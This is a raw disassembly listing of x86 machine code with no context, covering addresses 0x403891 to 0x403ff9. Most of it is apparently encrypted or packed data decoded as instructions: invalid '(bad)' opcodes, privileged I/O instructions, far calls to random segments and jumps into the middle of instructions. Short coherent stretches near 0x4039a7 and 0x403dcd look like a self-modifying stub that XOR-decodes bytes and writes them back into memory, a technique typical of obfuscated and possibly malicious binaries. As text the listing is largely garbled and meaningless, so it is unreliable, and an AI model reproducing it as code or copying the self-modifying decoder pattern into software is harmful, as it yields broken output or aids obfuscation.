  403891:	mov    edx,0x844f10f4
  403896:	fsubr  DWORD PTR [ebx-0x1bdf45b1]
  40389c:	test   al,0xfa
  40389e:	add    eax,0x87d55cf5
  4038a3:	jns    0x4038d9
  4038a5:	fsubr  st,st(1)
  4038a7:	fld    st(3)
  4038a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038aa:	aam    0x57
  4038ac:	and    eax,0x3819a514
  4038b1:	push   eax
  4038b2:	js     0x403841
  4038b4:	dec    esp
  4038b5:	cs ins DWORD PTR es:[edi],dx
  4038b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038b8:	push   ecx
  4038b9:	in     al,0x75
  4038bb:	dec    edi
  4038bc:	push   DWORD PTR [edi]
  4038be:	jae    0x4038a9
  4038c0:	ins    DWORD PTR es:[edi],dx
  4038c1:	push   edx
  4038c2:	cmp    al,0xfb
  4038c4:	cmp    ebx,DWORD PTR [esi+ebp*4]
  4038c7:	out    0x9f,al
  4038c9:	jns    0x4038a7
  4038cb:	cmp    esi,DWORD PTR [esi]
  4038cd:	ins    DWORD PTR es:[edi],dx
  4038ce:	retf   
  4038cf:	leave  
  4038d0:	dec    ebp
  4038d1:	icebp  
  4038d2:	push   ecx
  4038d3:	pop    edx
  4038d4:	das    
  4038d5:	jg     0x4038ff
  4038d7:	dec    ebx
  4038d8:	bound  edx,QWORD PTR [ebx-0x773eafbb]
  4038de:	and    edi,DWORD PTR [ebp-0x71]
  4038e1:	inc    edi
  4038e2:	mov    ah,0xae
  4038e4:	add    eax,0x2b352e0
  4038e9:	cmp    esi,esi
  4038eb:	lds    ebx,FWORD PTR [esi+0x7f]
  4038ee:	push   esp
  4038ef:	fild   QWORD PTR [ebp+0x695af996]
  4038f5:	loope  0x403957
  4038f7:	popa   
  4038f8:	pcmpgtb mm5,QWORD PTR [ebp-0x7e]
  4038fc:	iret   
  4038fd:	(bad)  
  4038fe:	xor    bh,BYTE PTR [esi-0x2]
  403901:	or     edi,DWORD PTR [ecx]
  403903:	mov    eax,ds:0xcdedb34
  403908:	rol    DWORD PTR [edi-0x1b],cl
  40390b:	(bad)  
  40390c:	test   BYTE PTR [edi-0x6a],0x26
  403910:	popa   
  403911:	inc    edx
  403912:	sbb    al,0xd0
  403914:	cmp    DWORD PTR [esi],edi
  403916:	loope  0x4038ed
  403918:	sub    eax,DWORD PTR [ebx-0x7d]
  40391b:	mov    ah,0x7c
  40391d:	std    
  40391e:	xchg   esi,eax
  40391f:	addr16 mov bl,0x3b
  403922:	inc    edi
  403923:	jns    0x403945
  403925:	dec    edi
  403926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403927:	xchg   edi,eax
  403928:	cdq    
  403929:	adc    DWORD PTR [edi-0x43],edx
  40392c:	ret    
  40392d:	sbb    esi,eax
  40392f:	pop    DWORD PTR [ebp-0x5d]
  403932:	xor    al,0x42
  403934:	icebp  
  403935:	js     0x403942
  403937:	mov    eax,ds:0xfbe73bc5
  40393c:	pop    esp
  40393d:	or     esp,DWORD PTR [esi+0x6f04f013]
  403943:	jb     0x4038fd
  403945:	in     eax,dx
  403946:	jg     0x403920
  403948:	iret   
  403949:	pop    ebp
  40394a:	mov    ebx,0x378d64d8
  40394f:	cmp    DWORD PTR [eax],0x6b
  403952:	(bad)  
  403953:	loope  0x403976
  403955:	sbb    eax,0xe96fc799
  40395a:	mov    edi,0x3f98bc70
  40395f:	adc    eax,esp
  403961:	mov    dl,0xa3
  403963:	add    DWORD PTR [ebp+0x7ad829db],esp
  403969:	ins    BYTE PTR es:[edi],dx
  40396a:	ds push ecx
  40396c:	mov    al,ds:0xa87b06f5
  403971:	pop    ss
  403972:	and    al,0x3f
  403974:	fcomp  st(5)
  403976:	rcr    DWORD PTR [eax+0x5c],1
  403979:	cld    
  40397a:	imul   esp
  40397c:	sub    al,dl
  40397e:	arpl   ax,si
  403980:	jno    0x4039d7
  403982:	xor    eax,0xb05cf11c
  403987:	sbb    al,0xc9
  403989:	pop    es
  40398a:	adc    al,0xb5
  40398c:	gs clc 
  40398e:	call   0x8593:0xb2fc968d
  403995:	ror    BYTE PTR [edi],0x84
  403998:	ss add al,0x0
  40399b:	add    BYTE PTR [ebp-0x977b],cl
  4039a1:	call   DWORD PTR [eax-0x75]
  4039a4:	inc    ebp
  4039a5:	in     al,0x33
  4039a7:	mov    BYTE PTR [ebx],0xc7
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	xor    eax,0xf7cd12d6
  4039d5:	sbb    eax,0x7d6f7e7e
  4039da:	jle    0x403a5a
  4039dc:	pushf  
  4039dd:	xor    DWORD PTR [eax+0x16],0x21
  4039e1:	add    BYTE PTR [ecx-0x80],al
  4039e4:	mov    dl,0xc6
  4039e6:	test   al,0xa2
  4039e8:	bound  ebp,QWORD PTR [ebx]
  4039ea:	jge    0x4039de
  4039ec:	push   0xffffffd7
  4039ee:	lock cmp DWORD PTR [esi],esi
  4039f1:	mov    WORD PTR [esi+0x2],es
  4039f4:	inc    esp
  4039f5:	daa    
  4039f6:	and    ebx,eax
  4039f8:	inc    ecx
  4039f9:	pop    esi
  4039fa:	xor    BYTE PTR [edi],dh
  4039fc:	sub    ah,dh
  4039fe:	stos   DWORD PTR es:[edi],eax
  4039ff:	push   edx
  403a00:	outs   dx,DWORD PTR ds:[esi]
  403a01:	cli    
  403a02:	call   0x3533:0x12d3abaf
  403a09:	fistp  WORD PTR ds:0xf58d4ae5
  403a0f:	icebp  
  403a10:	pop    esi
  403a11:	inc    esi
  403a12:	icebp  
  403a13:	push   ebx
  403a14:	mov    dh,0xc0
  403a16:	in     eax,0x30
  403a18:	mov    bl,0x22
  403a1a:	fdivrp st(2),st
  403a1c:	jge    0xe7d1ed10
  403a22:	sub    ch,al
  403a24:	jo     0x403a87
  403a26:	dec    edi
  403a27:	cli    
  403a28:	jno    0x4039c8
  403a2a:	mov    eax,ds:0xa9290fca
  403a2f:	cdq    
  403a30:	sbb    BYTE PTR ds:0x9d603b4d,ah
  403a36:	and    esp,DWORD PTR [ebx+0x5ad81892]
  403a3c:	dec    esp
  403a3d:	pop    es
  403a3e:	imul   eax,DWORD PTR [edi+0x0],0x24
  403a42:	xlat   BYTE PTR ds:[ebx]
  403a43:	push   edi
  403a44:	test   eax,0x2bbf1600
  403a49:	mov    edi,0x8a59f889
  403a4e:	pusha  
  403a4f:	out    dx,al
  403a50:	or     cl,al
  403a52:	sub    bl,bh
  403a54:	arpl   WORD PTR [eax],ax
  403a56:	test   ecx,eax
  403a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a59:	jp     0x403ac0
  403a5b:	nop
  403a5c:	dec    edx
  403a5d:	cld    
  403a5e:	push   ecx
  403a5f:	cwde   
  403a60:	cmp    eax,0xc7678860
  403a65:	out    0xd,eax
  403a67:	loope  0x403aba
  403a69:	jg     0x403a74
  403a6b:	and    DWORD PTR [edx-0x68e96a64],esi
  403a71:	fcomp  DWORD PTR [ecx]
  403a73:	or     ch,ah
  403a75:	iret   
  403a76:	out    dx,al
  403a77:	pop    es
  403a78:	into   
  403a79:	push   ss
  403a7a:	les    ebx,FWORD PTR [edi]
  403a7c:	and    eax,0xcb63e390
  403a81:	mov    esp,0xe3507bf8
  403a86:	(bad)  
  403a87:	xchg   esi,eax
  403a88:	adc    eax,0x95c0798e
  403a8d:	sub    eax,0x7742ec5c
  403a92:	add    ch,dl
  403a94:	lock out 0xc7,eax
  403a97:	fldenv [esp+ebx*1-0x74]
  403a9b:	inc    esi
  403a9c:	dec    edx
  403a9d:	clc    
  403a9e:	inc    dx
  403aa0:	adc    eax,0x7229b844
  403aa5:	mov    bh,0xbe
  403aa7:	sub    DWORD PTR [ecx+eiz*8-0x72],esp
  403aab:	call   0x1a9d7ec1
  403ab0:	sub    eax,0x64b1c6af
  403ab5:	(bad)  
  403ab6:	and    edi,DWORD PTR [ebx-0x39]
  403ab9:	jns    0x403a40
  403abb:	retf   
  403abc:	mov    cl,0xe7
  403abe:	ss inc ebx
  403ac0:	pushf  
  403ac1:	out    0x55,eax
  403ac3:	or     eax,0x13f7a9a7
  403ac8:	fsub   QWORD PTR [ebx-0x2e29682]
  403ace:	or     eax,0x96fccf51
  403ad3:	pop    ecx
  403ad4:	and    BYTE PTR [ebp-0x3a],ah
  403ad7:	adc    esp,esp
  403ad9:	cdq    
  403ada:	inc    esp
  403adb:	rcl    esp,1
  403add:	mov    WORD PTR [esi-0x51],es
  403ae0:	sbb    dh,BYTE PTR [esi+edi*1]
  403ae3:	jmp    0xa24d:0xe545d373
  403aea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403aeb:	stc    
  403aec:	call   0x96e6:0x7ad00169
  403af3:	popa   
  403af4:	and    esp,esp
  403af6:	cmp    dh,BYTE PTR [ebx-0x73]
  403af9:	outs   dx,DWORD PTR ds:[esi]
  403afa:	jle    0x403a87
  403afc:	repnz sbb al,BYTE PTR [eax+0x44]
  403b00:	das    
  403b01:	cld    
  403b02:	adc    BYTE PTR [eax+0x397011ec],al
  403b08:	adc    edi,DWORD PTR [edx-0xc798cf1]
  403b0e:	inc    edx
  403b0f:	xchg   ecx,eax
  403b10:	mov    ds:0xfb4edb22,eax
  403b15:	adc    ecx,DWORD PTR [esi-0x21102ff5]
  403b1b:	mov    eax,0x363dcdea
  403b20:	ins    BYTE PTR es:[edi],dx
  403b21:	xor    al,0x68
  403b23:	fsubp  st(7),st
  403b25:	cmp    al,0x43
  403b27:	cmp    eax,0xa7c0e8ad
  403b2c:	in     al,0x93
  403b2e:	lahf   
  403b2f:	push   ds
  403b30:	sbb    DWORD PTR [ebx],edx
  403b32:	mov    cl,0xa3
  403b34:	xchg   edx,eax
  403b35:	(bad)  
  403b36:	xchg   edx,eax
  403b37:	mov    al,0x71
  403b39:	pop    ecx
  403b3a:	sbb    eax,0xa8d42318
  403b3f:	pusha  
  403b40:	mov    eax,0xce428c10
  403b45:	cmp    BYTE PTR [edx],bh
  403b47:	stos   BYTE PTR es:[edi],al
  403b48:	sub    esp,DWORD PTR [eax-0x6a]
  403b4b:	mov    dl,al
  403b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b4e:	imul   esi,edx,0xffffffea
  403b51:	aad    0x24
  403b53:	inc    ebp
  403b54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b55:	jmp    0x65342d9a
  403b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b5b:	sub    edx,esi
  403b5d:	imul   ebx,DWORD PTR [eax-0x24],0xc9f7cd84
  403b64:	pop    ds
  403b65:	pop    es
  403b66:	vpshlw ymm5,xmm2,[ecx]
  403b6b:	test   BYTE PTR [ebx-0xa],0xa1
  403b6f:	ss xchg esp,eax
  403b71:	call   0xd300:0x12969dfe
  403b78:	les    edi,FWORD PTR [edi+edi*2-0x2a99e49a]
  403b7f:	mov    bh,0xc1
  403b81:	dec    esp
  403b82:	out    0xfb,al
  403b84:	mov    dl,0x78
  403b86:	mov    cs:0x9a598287,al
  403b8c:	adc    esi,0xfffffff0
  403b8f:	inc    ebp
  403b90:	fsubr  QWORD PTR [esi]
  403b92:	lock pop edx
  403b94:	popa   
  403b95:	mov    ah,0x85
  403b97:	(bad)  
  403b98:	mov    ah,BYTE PTR [edi]
  403b9a:	xchg   esi,eax
  403b9b:	jae    0x403b49
  403b9d:	sbb    dl,ch
  403b9f:	out    0x37,eax
  403ba1:	(bad)  
  403ba2:	loop   0x403bb8
  403ba4:	dec    esp
  403ba5:	jmp    0x36fa:0x6e1cbb3c
  403bac:	mov    bh,0xe3
  403bae:	mov    ebx,0x8496bf01
  403bb3:	shl    DWORD PTR [ebx+0x18],0x7a
  403bb7:	jmp    0xc13a:0x43e9fcfb
  403bbe:	ret    
  403bbf:	jb     0x403c30
  403bc1:	sbb    BYTE PTR [edi+0x1e],0x3
  403bc5:	inc    esp
  403bc6:	mov    dh,dl
  403bc8:	neg    DWORD PTR [ecx+eax*4-0x1f]
  403bcc:	jl     0x403bb0
  403bce:	stos   DWORD PTR es:[edi],eax
  403bcf:	cmp    ebx,ecx
  403bd1:	xlat   BYTE PTR ds:[ebx]
  403bd2:	push   esi
  403bd3:	xor    al,0xcf
  403bd5:	add    eax,0x7ec8da56
  403bda:	fwait
  403bdb:	cmp    DWORD PTR ds:[eax],ebx
  403bde:	sbb    DWORD PTR [esp+ecx*1-0x70],ebx
  403be2:	mov    dh,0x99
  403be4:	dec    ebp
  403be5:	outs   dx,DWORD PTR ds:[esi]
  403be6:	fwait
  403be7:	add    eax,0x79866b49
  403bec:	add    DWORD PTR [edx+0x2a],esp
  403bef:	mov    edi,0xcdeeb1b6
  403bf4:	jns    0x403b77
  403bf6:	imul   ecx,DWORD PTR [edx-0x6],0x85f6af6d
  403bfd:	cmp    eax,0xffffffc5
  403c00:	out    dx,eax
  403c01:	sahf   
  403c02:	icebp  
  403c03:	push   ebx
  403c04:	scas   eax,DWORD PTR es:[edi]
  403c05:	ins    BYTE PTR es:[edi],dx
  403c06:	mov    esp,0xaf736ee4
  403c0b:	mov    bl,0xe9
  403c0d:	addr16 hlt 
  403c0f:	clc    
  403c10:	jmp    0x403bad
  403c12:	push   edi
  403c13:	push   ebp
  403c14:	lock loope 0x403c7c
  403c17:	rol    esp,1
  403c19:	push   eax
  403c1a:	call   0x7b01:0xc6ba
  403c20:	rol    DWORD PTR [ecx+0x20],1
  403c23:	pop    esp
  403c24:	je     0x403c7b
  403c26:	mov    edi,0x11720a12
  403c2b:	xrelease mov DWORD PTR [edi-0x6f11b59b],ebx
  403c32:	mov    bl,0xfd
  403c34:	mov    ah,0x77
  403c36:	out    0x5e,al
  403c38:	pop    ss
  403c39:	jbe    0x403c8e
  403c3b:	clc    
  403c3c:	push   esi
  403c3d:	daa    
  403c3e:	push   es
  403c3f:	fmul   QWORD PTR [edi]
  403c41:	push   ebx
  403c42:	hlt    
  403c43:	push   edi
  403c44:	aam    0xda
  403c46:	ret    0xd767
  403c49:	scas   eax,DWORD PTR es:[edi]
  403c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c4b:	popa   
  403c4c:	in     al,dx
  403c4d:	int    0x88
  403c4f:	(bad)  
  403c50:	std    
  403c51:	cmp    edx,DWORD PTR [esi-0x6cea26bd]
  403c57:	ja     0x403cc8
  403c59:	mov    ebx,0x19dc72a4
  403c5e:	ret    0x2985
  403c61:	cs sub eax,0x19b9ab34
  403c67:	mov    al,0xd0
  403c69:	cmp    al,0x3e
  403c6b:	cmc    
  403c6c:	outs   dx,BYTE PTR ds:[esi]
  403c6d:	aad    0x9b
  403c6f:	push   ecx
  403c70:	icebp  
  403c71:	xor    DWORD PTR [ebp+0x5e],0x46
  403c75:	popf   
  403c76:	mov    ecx,0xc5d86389
  403c7b:	dec    ebx
  403c7c:	or     BYTE PTR [eax+0x56],0x9a
  403c80:	shl    bh,cl
  403c82:	sbb    eax,0x81a392e6
  403c87:	ret    
  403c88:	mov    al,ds:0xf2bbe998
  403c8d:	loop   0x403d0d
  403c8f:	xchg   ebx,eax
  403c90:	fadd   st(1),st
  403c92:	xor    ebx,DWORD PTR [esi-0x4d]
  403c95:	xchg   ecx,eax
  403c96:	bound  ebp,QWORD PTR [edi]
  403c98:	xor    ebp,DWORD PTR [ecx+0x4e]
  403c9b:	in     al,0x9e
  403c9d:	adc    al,0xde
  403c9f:	sub    edi,DWORD PTR [ecx+edx*1+0x75]
  403ca3:	addr16 and esi,ebp
  403ca6:	dec    esp
  403ca7:	or     eax,0x112fae06
  403cac:	xchg   ecx,eax
  403cad:	cmc    
  403cae:	sbb    dl,0x5f
  403cb1:	call   0xc594:0xceb25c9e
  403cb8:	pop    ss
  403cb9:	es push ss
  403cbb:	mov    ebx,0x1477e6f8
  403cc0:	sub    DWORD PTR [eax+ecx*1-0x51fb869a],eax
  403cc7:	cld    
  403cc8:	and    DWORD PTR [esp+edi*1],eax
  403ccb:	enter  0x250f,0x5c
  403ccf:	mov    eax,ds:0xe6909bdc
  403cd4:	jno    0x403d1a
  403cd6:	(bad)  
  403cd7:	jne    0x403cca
  403cd9:	lods   al,BYTE PTR ds:[esi]
  403cda:	mov    bh,0x1c
  403cdc:	(bad)  
  403cde:	mov    dh,0x11
  403ce0:	sub    dl,BYTE PTR [eax-0x29]
  403ce3:	sbb    al,BYTE PTR [ecx-0x613afa1c]
  403ce9:	ficom  WORD PTR [ebx+0x2b]
  403cec:	clc    
  403ced:	jl     0x403d33
  403cef:	(bad)  
  403cf0:	dec    BYTE PTR [edx]
  403cf2:	fld    DWORD PTR [eax+edi*8]
  403cf5:	into   
  403cf6:	and    al,0xbf
  403cf8:	sahf   
  403cf9:	repnz leave 
  403cfb:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cfd:	pop    esp
  403cfe:	jl     0x403d33
  403d00:	and    DWORD PTR [eax+ebx*2-0x21b624b2],edx
  403d07:	pop    ds
  403d08:	xchg   edi,eax
  403d09:	inc    eax
  403d0b:	xor    al,0xc0
  403d0d:	mov    bl,0x75
  403d0f:	xor    ch,bl
  403d11:	popf   
  403d12:	lods   al,BYTE PTR ds:[esi]
  403d13:	sbb    al,0x74
  403d15:	das    
  403d16:	ins    BYTE PTR es:[edi],dx
  403d17:	out    0x56,eax
  403d19:	sahf   
  403d1a:	sub    cl,BYTE PTR [ebx+ebx*8+0x623862e]
  403d21:	imul   edi,DWORD PTR ds:0xb98f3f24,0x8eea784b
  403d2b:	iret   
  403d2c:	push   0xffffff8f
  403d2e:	int    0xc
  403d30:	dec    esp
  403d31:	fadd   st,st(2)
  403d33:	int3   
  403d34:	retf   0xe3d5
  403d37:	gs cmp eax,0xd212afbe
  403d3d:	icebp  
  403d3e:	std    
  403d3f:	(bad)  
  403d40:	push   ss
  403d41:	int    0xa2
  403d43:	lock test eax,0x81650575
  403d49:	or     BYTE PTR [esi-0x5bc1e740],cl
  403d4f:	push   0xffffffad
  403d51:	cwde   
  403d52:	dec    ebp
  403d53:	in     al,0xa8
  403d55:	sub    bl,0x46
  403d58:	xor    ch,BYTE PTR [esi]
  403d5a:	les    edi,FWORD PTR [eax+0xe]
  403d5d:	mov    cl,0x9e
  403d5f:	call   0xc9387383
  403d64:	pusha  
  403d65:	(bad)  
  403d67:	jae    0x403d87
  403d69:	cli    
  403d6a:	mov    ebx,0x8b54d49
  403d6f:	and    al,0x70
  403d71:	outs   dx,DWORD PTR ds:[esi]
  403d72:	sbb    eax,0xcfcb4c5a
  403d77:	mov    bl,0xa6
  403d79:	xchg   ebx,eax
  403d7a:	sar    DWORD PTR [esi-0x77743eeb],cl
  403d80:	nop
  403d81:	adc    eax,0xae556b09
  403d86:	or     al,0x82
  403d88:	jecxz  0x403d38
  403d8a:	xchg   esp,eax
  403d8b:	imul   BYTE PTR [ebp-0x6c42e18a]
  403d91:	ret    0xc74a
  403d94:	repnz push 0xffffffad
  403d97:	add    DWORD PTR [ebp-0x5f],0x4
  403d9b:	mov    al,0x1c
  403d9d:	adc    ebp,DWORD PTR [ebx]
  403d9f:	lea    ebx,[edi+0x31bb99e4]
  403da5:	add    DWORD PTR [eax+ebx*8-0x72],edi
  403da9:	loop   0x403d59
  403dab:	xor    ah,al
  403dad:	cmp    al,0x16
  403daf:	sub    eax,eax
  403db1:	(bad)  
  403db2:	jecxz  0x403e1d
  403db4:	cli    
  403db5:	sub    eax,0xd0bca12
  403dba:	and    BYTE PTR [eax],cl
  403dbc:	cmp    al,0x2e
  403dbe:	mov    eax,DWORD PTR [esi]
  403dc0:	adc    ch,dh
  403dc2:	mov    ecx,0x6c90d791
  403dc7:	and    eax,0x32015029
  403dcc:	stos   BYTE PTR es:[edi],al
  403dcd:	call   0x40c099
  403dd2:	mov    ecx,DWORD PTR [ebp-0x28]
  403dd5:	xor    ecx,esi
  403dd7:	mov    eax,0xffcd8d65
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    DWORD PTR [edi-0x1bc7fcb3],ecx
  403e17:	sbb    DWORD PTR [esi+0x7e],edi
  403e1a:	outs   dx,DWORD PTR ds:[esi]
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403da2
  403e1f:	sbb    ecx,DWORD PTR [ebx]
  403e21:	les    edx,FWORD PTR [ebx+0x24e596fe]
  403e27:	dec    eax
  403e28:	sub    cl,BYTE PTR [ebx+0x510c700e]
  403e2e:	ins    DWORD PTR es:[edi],dx
  403e2f:	call   0x53c8:0x53a345ef
  403e36:	retf   0xe7c3
  403e39:	xchg   BYTE PTR [ecx-0x313be760],dl
  403e3f:	mov    ebx,0x708d3801
  403e44:	hlt    
  403e45:	or     BYTE PTR [ebp-0x18],al
  403e48:	cmp    DWORD PTR [edi],edi
  403e4a:	xor    al,0x6d
  403e4c:	or     ebp,DWORD PTR [eax-0x7b]
  403e4f:	shl    esp,cl
  403e51:	ins    BYTE PTR es:[edi],dx
  403e52:	aam    0x14
  403e54:	and    ecx,eax
  403e56:	cmp    al,0x71
  403e58:	enter  0x350,0xfb
  403e5c:	push   0x1e
  403e5e:	xchg   ebp,eax
  403e5f:	stc    
  403e60:	or     DWORD PTR [esi+0xb94bfd8],ebp
  403e66:	sahf   
  403e67:	bound  edx,QWORD PTR [ecx-0x1a]
  403e6a:	shl    edi,0xfd
  403e6d:	hlt    
  403e6e:	sti    
  403e6f:	arpl   WORD PTR [ecx-0x43e2ec31],dx
  403e75:	xchg   ecx,eax
  403e76:	mov    dl,0x3c
  403e78:	das    
  403e79:	sahf   
  403e7a:	adc    al,BYTE PTR [edx-0x5]
  403e7d:	fsubr  st,st(7)
  403e7f:	mov    ds:0xa8a10957,al
  403e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e85:	(bad)  
  403e87:	sar    BYTE PTR [eax],0xf0
  403e8a:	pop    ebp
  403e8b:	mov    edx,0x2ff75c60
  403e90:	inc    edx
  403e91:	pushf  
  403e92:	(bad)  
  403e93:	jmp    0x624:0xb28a88f3
  403e9a:	arpl   WORD PTR [edi],bx
  403e9c:	adc    edi,DWORD PTR [edi-0x63]
  403e9f:	dec    eax
  403ea0:	sub    BYTE PTR ds:0x31d726d1,ah
  403ea6:	retf   0xe379
  403ea9:	xor    edi,ecx
  403eab:	pop    ecx
  403eac:	pop    ds
  403ead:	aas    
  403eae:	cmc    
  403eaf:	popf   
  403eb0:	addr16 inc ecx
  403eb2:	add    esp,DWORD PTR [edx]
  403eb4:	jbe    0x403e41
  403eb6:	and    al,0xb1
  403eb8:	cld    
  403eb9:	push   cs
  403eba:	cs pushf 
  403ebc:	loopne 0x403ed3
  403ebe:	lds    ebp,FWORD PTR [edi+edi*8]
  403ec1:	mov    dl,0x1b
  403ec3:	aad    0xb0
  403ec5:	fdiv   DWORD PTR gs:[edi+0x1c]
  403ec9:	addr16 loope 0x403f03
  403ecc:	push   ecx
  403ecd:	test   eax,0x3294b7f3
  403ed2:	cwde   
  403ed3:	fistp  DWORD PTR [ecx]
  403ed5:	inc    ecx
  403ed6:	mov    WORD PTR [ebx],ds
  403ed8:	je     0x403eae
  403eda:	pop    ebx
  403edb:	jecxz  0x403f58
  403edd:	ret    0x51c4
  403ee0:	jg     0x403e6b
  403ee2:	mov    DWORD PTR [ebp-0x2a2013e],ebx
  403ee8:	mov    ch,0x66
  403eea:	xchg   ecx,eax
  403eeb:	out    0x57,eax
  403eed:	fld1   
  403eef:	cs mov bl,0x2
  403ef2:	mov    DWORD PTR [ecx+0x25],eax
  403ef5:	xchg   edx,eax
  403ef6:	sub    BYTE PTR [ebp+0x6c],bh
  403ef9:	stos   DWORD PTR es:[edi],eax
  403efa:	icebp  
  403efb:	scas   eax,DWORD PTR es:[edi]
  403efc:	mov    ds:0xe09bd898,al
  403f01:	icebp  
  403f02:	(bad)  
  403f03:	jle    0x403f13
  403f05:	hlt    
  403f06:	sub    BYTE PTR [ebp-0x5b3f83b6],0x6f
  403f0d:	push   ds
  403f0e:	lods   eax,DWORD PTR ds:[esi]
  403f0f:	dec    esi
  403f10:	adc    eax,0x596236d0
  403f15:	add    DWORD PTR [edi],esp
  403f17:	out    0x43,al
  403f19:	dec    ecx
  403f1a:	mov    bl,0xa4
  403f1c:	mov    esp,0x3686cda0
  403f21:	dec    ecx
  403f22:	popf   
  403f23:	lods   eax,DWORD PTR ds:[esi]
  403f24:	push   esp
  403f25:	sti    
  403f26:	inc    edx
  403f27:	lock jo 0x403f2f
  403f2a:	cli    
  403f2b:	mov    ah,0x21
  403f2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f2e:	popa   
  403f2f:	mov    ah,dl
  403f31:	xor    DWORD PTR [eax],ecx
  403f33:	jecxz  0x403f61
  403f35:	pop    ebp
  403f36:	scas   al,BYTE PTR es:[edi]
  403f37:	pop    ebp
  403f38:	mov    al,0xdb
  403f3a:	sbb    al,0x3f
  403f3c:	pop    esp
  403f3d:	sbb    BYTE PTR [ebx],cl
  403f3f:	imul   DWORD PTR [eax-0x77fabf5f]
  403f45:	jbe    0x403f03
  403f47:	lods   eax,DWORD PTR gs:[esi]
  403f49:	xchg   DWORD PTR cs:[edx+0x18],ebp
  403f4d:	push   ss
  403f4e:	sbb    al,0xf0
  403f50:	mov    DWORD PTR [edi-0x53],edi
  403f53:	ja     0x403ee5
  403f55:	retf   
  403f56:	adc    bh,0x1c
  403f59:	add    ebx,edx
  403f5b:	jae    0x403ef3
  403f5d:	pop    esp
  403f5e:	mov    BYTE PTR [edi+0x68],dh
  403f61:	int3   
  403f62:	enter  0x8e64,0xee
  403f66:	(bad)  
  403f67:	xchg   edx,eax
  403f68:	fiadd  DWORD PTR fs:[ecx+esi*1]
  403f6c:	in     eax,0xff
  403f6e:	xchg   esi,eax
  403f6f:	push   ebx
  403f70:	mov    bh,0xc9
  403f72:	inc    esp
  403f73:	mov    dl,0xcd
  403f75:	cmp    eax,0xb0ebe3d0
  403f7a:	push   edx
  403f7b:	retf   0x83aa
  403f7e:	xor    eax,0x1e7daf5
  403f83:	stos   DWORD PTR es:[edi],eax
  403f84:	icebp  
  403f85:	(bad)  
  403f86:	mov    dh,0x87
  403f88:	jle    0x403f53
  403f8a:	ret    
  403f8b:	daa    
  403f8c:	je     0x403f92
  403f8e:	ja     0x403ff8
  403f90:	adc    dl,al
  403f92:	les    ebx,FWORD PTR [esi]
  403f94:	mov    ah,0x6f
  403f96:	mov    ebx,0x2214f99
  403f9b:	arpl   sp,di
  403f9d:	xchg   BYTE PTR [ebx+0x39],ah
  403fa0:	outs   dx,BYTE PTR ds:[esi]
  403fa1:	and    BYTE PTR [esi-0x7c],ah
  403fa4:	sbb    al,0xde
  403fa6:	adc    eax,0x27dc04be
  403fab:	mov    WORD PTR [esp+ebx*1-0x7f5e2ff2],es
  403fb2:	sbb    BYTE PTR [ebp+0x148a6b68],dh
  403fb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fb9:	adc    ch,ch
  403fbb:	push   eax
  403fbc:	clc    
  403fbd:	inc    esp
  403fbe:	jnp    0x403fa0
  403fc0:	rol    BYTE PTR [eax+0x23],cl
  403fc3:	sub    bh,bh
  403fc5:	or     BYTE PTR [ebx],ch
  403fc7:	stos   DWORD PTR es:[edi],eax
  403fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fc9:	data16 test BYTE PTR [eax],0x55
  403fcd:	popa   
  403fce:	sbb    DWORD PTR [ecx+edi*1],eax
  403fd1:	stos   BYTE PTR es:[edi],al
  403fd2:	jbe    0x403fa2
  403fd4:	test   bl,bh
  403fd6:	or     eax,0x87a02f2e
  403fdb:	mov    edx,0x2ff42ef9
  403fe0:	push   eax
  403fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fe2:	sti    
  403fe3:	xchg   esi,eax
  403fe4:	out    0x88,al
  403fe6:	and    DWORD PTR [eax],eax
  403fe8:	outs   dx,DWORD PTR ds:[esi]
  403fe9:	mov    ebx,DWORD PTR [ebx+0x6f22bae5]
  403fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ff0:	pop    ecx
  403ff1:	mov    eax,0xf33f9b68
  403ff6:	outs   dx,BYTE PTR ds:[esi]
  403ff7:	or     bl,BYTE PTR [ebx]
  403ff9:	mov    edx,DWORD PTR [ecx-0x23b5de78]
